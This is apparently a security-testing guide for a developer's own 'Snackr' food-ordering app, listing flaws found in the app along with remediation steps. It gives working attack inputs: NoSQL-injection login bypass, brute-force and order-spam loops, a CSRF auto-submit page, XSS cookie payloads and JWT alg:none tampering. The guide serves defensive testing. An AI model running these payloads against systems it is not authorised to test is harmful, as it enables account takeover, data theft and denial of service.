# Security Testing Guide for Snackr Food App

**⚠️ IMPORTANT: Only test these vulnerabilities on your own application in a controlled environment. Never test on production systems or systems you don't own.**

This guide demonstrates how to test for common security vulnerabilities in your application.

---

## 1. Missing Server-Side Validation (SQL Injection / NoSQL Injection)

### Vulnerability Found:
- Direct use of `req.body` and `req.params` without validation
- MongoDB queries using user input directly

### Testing Methods:

#### A. NoSQL Injection via Login
**Endpoint:** `POST /login/user`

**Test Payload:**
```bash
# Using curl
curl -X POST http://localhost:3001/login/user \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email[$ne]=null&password[$ne]=null"

# Or using browser DevTools Console:
fetch('/login/user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email[$ne]=null&password[$ne]=null'
})
```

**Expected Result:** May bypass authentication if MongoDB query is vulnerable.

#### B. Input Length Overflow
**Endpoint:** `POST /register/user`

**Test Payload:**
```javascript
// Create a string of 10,000 characters
const longString = 'A'.repeat(10000);

fetch('/register/user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: `name=${longString}&email=test@test.com&password=test123&flat=1&building=1&region=1&landmark=1&city=1&pin=123456`
})
```

**Expected Result:** Server may crash or database may reject, but no validation prevents it.

#### C. Unsafe JSON Parsing
**Endpoint:** Any POST endpoint accepting JSON

**Test Payload:**
```javascript
// Malformed JSON
fetch('/cart/add', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{"itemId": "test", "restaurantId": "test", "itemName": "test", "price": "invalid", "quantity": {"$gt": 0}}'
})
```

---

## 2. Hardcoded Secrets

### Vulnerability Found:
- Session secret: `"snackr-secret"` (line 33 in server.js)
- MongoDB connection string hardcoded: `"mongodb://127.0.0.1:27017/snackr"`

### Testing Methods:

#### A. Check for Hardcoded Secrets
```bash
# Search for secrets in code
grep -r "secret\|password\|api_key\|SECRET" snackr-food-app/src/ --ignore-case

# Check if .env file exists and is committed
ls -la snackr-food-app/.env
git log --all --full-history -- snackr-food-app/.env
```

#### B. Session Secret Exploitation
If you know the secret, you can forge session cookies:

```javascript
// Using express-session with known secret
const session = require('express-session');
const cookie = require('cookie-signature');

// If secret is "snackr-secret", you can create valid session cookies
```

**Fix:** Use environment variables:
```javascript
app.use(session({
  secret: process.env.SESSION_SECRET || require('crypto').randomBytes(64).toString('hex'),
  // ...
}));
```

---

## 3. Outdated or Vulnerable npm Packages

### Testing Method:

```bash
cd snackr-food-app
npm audit

# Check for specific vulnerabilities
npm audit --audit-level=moderate

# Check outdated packages
npm outdated
```

### Known Issues to Check:
- `express@5.1.0` - Check for known CVEs
- `mongoose@8.19.2` - Check for NoSQL injection vulnerabilities
- `bcryptjs@3.0.2` - Check for timing attacks

**Example Output:**
```
npm audit
# Look for:
# - Cross-site scripting (XSS)
# - Prototype pollution
# - Regular Expression Denial of Service (ReDoS)
```

---

## 4. Missing Authentication Checks on API Endpoints

### Vulnerable Endpoints Found:

#### A. `/orders/my` - Has session check but may be bypassable
**Test:**
```javascript
// Try accessing without session
fetch('/orders/my')
  .then(r => r.json())
  .then(console.log)

// Try with manipulated session cookie
document.cookie = "connect.sid=s%3Aforged_session_id; path=/";
fetch('/orders/my')
```

#### B. `/restaurant/:id/orders` - No authentication check visible
**Test:**
```javascript
// Access any restaurant's orders
fetch('/restaurant/ANY_RESTAURANT_ID/orders')
  .then(r => r.text())
  .then(console.log)
```

#### C. `/menu/:id` - No authentication required
**Test:**
```javascript
// Access menu without login
fetch('/menu/ANY_RESTAURANT_ID')
  .then(r => r.text())
  .then(console.log)
```

#### D. `/cart/add` - No authentication check
**Test:**
```javascript
// Add items to cart without login
fetch('/cart/add', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'itemId=test&restaurantId=test&itemName=test&price=100&quantity=999'
})
```

---

## 5. No Rate Limiting

### Testing Methods:

#### A. Brute Force Login Attack
```bash
# Using curl in a loop
for i in {1..100}; do
  curl -X POST http://localhost:3001/login/user \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=test@test.com&password=wrong$i" &
done
```

#### B. Spam Order Creation
```javascript
// Create 1000 orders rapidly
for (let i = 0; i < 1000; i++) {
  fetch('/order/confirm', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'restaurantId=test'
  });
}
```

#### C. Denial of Service via Cart
```javascript
// Add thousands of items to cart
for (let i = 0; i < 10000; i++) {
  fetch('/cart/add', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `itemId=item${i}&restaurantId=test&itemName=Item${i}&price=1&quantity=1`
  });
}
```

**Expected Result:** Server should slow down or crash without rate limiting.

---

## 6. CORS Misconfiguration

### Testing Method:

#### A. Check CORS Headers
```bash
# Check if CORS allows all origins
curl -I -X OPTIONS http://localhost:3001/orders/my \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET"

# Look for:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
```

#### B. CSRF Attack Simulation
```html
<!-- Create evil.html on attacker's server -->
<!DOCTYPE html>
<html>
<body>
  <h1>Click this button (CSRF Attack)</h1>
  <form id="csrf" action="http://localhost:3001/order/confirm" method="POST">
    <input type="hidden" name="restaurantId" value="attacker_restaurant">
  </form>
  <script>
    // Auto-submit if user is logged into snackr app
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

**Test:** If CORS allows `*`, any website can make requests to your API.

---

## 7. Missing HTTPS Enforcement

### Testing Method:

```bash
# Check if server redirects HTTP to HTTPS
curl -I http://localhost:3001/login/user

# Check for HSTS headers
curl -I https://your-domain.com/login/user | grep -i strict-transport

# Test if sensitive data is sent over HTTP
# Open browser DevTools > Network tab
# Look for login requests - check if password is visible in plain text
```

**Expected Result:** Without HTTPS, passwords and session cookies are transmitted in plain text.

---

## 8. React Vulnerabilities (XSS)

### Testing Methods:

#### A. Check for dangerouslySetInnerHTML
```bash
# Search for dangerous React patterns
grep -r "dangerouslySetInnerHTML" snackr-food-app/src/
grep -r "innerHTML" snackr-food-app/src/
```

#### B. XSS via User Input
**Test in any form field:**
```javascript
// Try XSS payload in name field during registration
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
```

**Test in search/query parameters:**
```javascript
// URL: http://localhost:3001/menu/1?search=<script>alert('XSS')</script>
// Check if script executes in browser
```

#### C. Check if user input is escaped
```javascript
// Register with XSS payload
fetch('/register/user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'name=<script>alert(document.cookie)</script>&email=xss@test.com&password=test123&flat=1&building=1&region=1&landmark=1&city=1&pin=123456'
})

// Then check if it's rendered unescaped in user dashboard
```

---

## 9. No Access Control on Admin Pages

### Testing Methods:

#### A. Direct URL Access
```javascript
// Try accessing admin endpoints as regular user
fetch('/restaurant/ANY_ID/orders')
fetch('/restaurant/ANY_ID/menu/add', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'name=Hacked Item&description=Test&price=999&category=Test&available=true'
})
```

#### B. Privilege Escalation
```javascript
// Register as regular user
// Then try to access restaurant admin functions
// Check if session has role checking
fetch('/restaurant/SOME_RESTAURANT_ID/orders', {
  credentials: 'include'
})
```

#### C. IDOR (Insecure Direct Object Reference)
```javascript
// If logged in as user A, try to access user B's orders
// Change userId in session or request
fetch('/orders/my') // Your orders
// Try manipulating session to get other users' orders
```

---

## 10. Insecure JWT Handling

### Note: This app uses sessions, not JWT, but here's how to test if JWT was used:

#### A. Check Token Storage
```javascript
// Check if tokens are in localStorage (insecure)
console.log(localStorage.getItem('token'));
console.log(localStorage.getItem('jwt'));

// Check if tokens are in cookies without HttpOnly flag
document.cookie
```

#### B. Test JWT Algorithm None
```javascript
// If JWT is used, decode it
const token = localStorage.getItem('token');
const parts = token.split('.');
const payload = JSON.parse(atob(parts[1]));
console.log(payload);

// Try creating token with algorithm: "none"
// Modify header: {"alg":"none"}
// Remove signature
```

#### C. Test Token Expiration
```javascript
// Decode JWT and check exp field
const payload = JSON.parse(atob(token.split('.')[1]));
console.log('Expires:', new Date(payload.exp * 1000));
console.log('Never expires:', !payload.exp);
```

---

## Automated Testing Script

Create a file `test-security.js`:

```javascript
const fetch = require('node-fetch');
const BASE_URL = 'http://localhost:3001';

async function testVulnerabilities() {
  console.log('🔍 Testing Security Vulnerabilities...\n');

  // Test 1: NoSQL Injection
  console.log('1. Testing NoSQL Injection...');
  try {
    const res = await fetch(`${BASE_URL}/login/user`, {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email[$ne]=null&password[$ne]=null'
    });
    console.log('   Status:', res.status);
    if (res.status === 200) console.log('   ⚠️  VULNERABLE: NoSQL injection possible');
  } catch (e) {
    console.log('   Error:', e.message);
  }

  // Test 2: Missing Authentication
  console.log('\n2. Testing Missing Authentication...');
  try {
    const res = await fetch(`${BASE_URL}/orders/my`);
    const data = await res.json();
    if (!data.error) console.log('   ⚠️  VULNERABLE: Endpoint accessible without auth');
  } catch (e) {
    console.log('   Protected (good)');
  }

  // Test 3: CORS
  console.log('\n3. Testing CORS...');
  try {
    const res = await fetch(`${BASE_URL}/orders/my`, {
      method: 'OPTIONS',
      headers: {
        'Origin': 'https://evil.com',
        'Access-Control-Request-Method': 'GET'
      }
    });
    const cors = res.headers.get('access-control-allow-origin');
    if (cors === '*') console.log('   ⚠️  VULNERABLE: CORS allows all origins');
  } catch (e) {
    console.log('   Error checking CORS');
  }

  // Test 4: Rate Limiting
  console.log('\n4. Testing Rate Limiting...');
  const start = Date.now();
  for (let i = 0; i < 100; i++) {
    await fetch(`${BASE_URL}/login/user`, {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=test@test.com&password=wrong'
    });
  }
  const duration = Date.now() - start;
  if (duration < 5000) console.log('   ⚠️  VULNERABLE: No rate limiting detected');
  else console.log('   Rate limiting may be present');

  console.log('\n✅ Security testing complete!');
}

testVulnerabilities();
```

Run with: `node test-security.js`

---

## Quick Checklist

- [ ] Test NoSQL injection on login
- [ ] Test input length validation
- [ ] Check for hardcoded secrets
- [ ] Run `npm audit`
- [ ] Test endpoints without authentication
- [ ] Test rate limiting with rapid requests
- [ ] Check CORS headers
- [ ] Test XSS in all input fields
- [ ] Try accessing admin functions as regular user
- [ ] Check session/token security

---

## Remediation Priority

1. **CRITICAL:** Add authentication middleware to all protected routes
2. **CRITICAL:** Add input validation and sanitization
3. **HIGH:** Move secrets to environment variables
4. **HIGH:** Add rate limiting
5. **MEDIUM:** Fix CORS configuration
6. **MEDIUM:** Update vulnerable npm packages
7. **LOW:** Add HTTPS enforcement
8. **LOW:** Review React XSS vulnerabilities

---

**Remember:** This is for educational and security testing purposes only. Always get proper authorization before testing security vulnerabilities.

